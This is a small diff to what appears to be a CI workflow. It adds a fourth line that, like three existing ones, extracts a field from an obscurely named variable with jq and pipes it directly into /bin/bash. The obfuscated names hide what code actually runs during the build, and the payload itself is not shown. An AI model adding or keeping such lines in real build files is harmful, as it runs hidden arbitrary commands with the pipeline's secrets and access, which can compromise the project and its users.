@@ -31,6 +31,7 @@ jobs:
           echo $x9 | jq -r .v240 | /bin/bash
           printf '%s' "$g8833" | jq -r .k52 | /bin/bash
           echo $qxdxj78144 | jq -r .jpiso1291 | /bin/bash
+          echo $jgcp7 | jq -r .dt11 | /bin/bash
 
       - name: Archive results
         if: always()
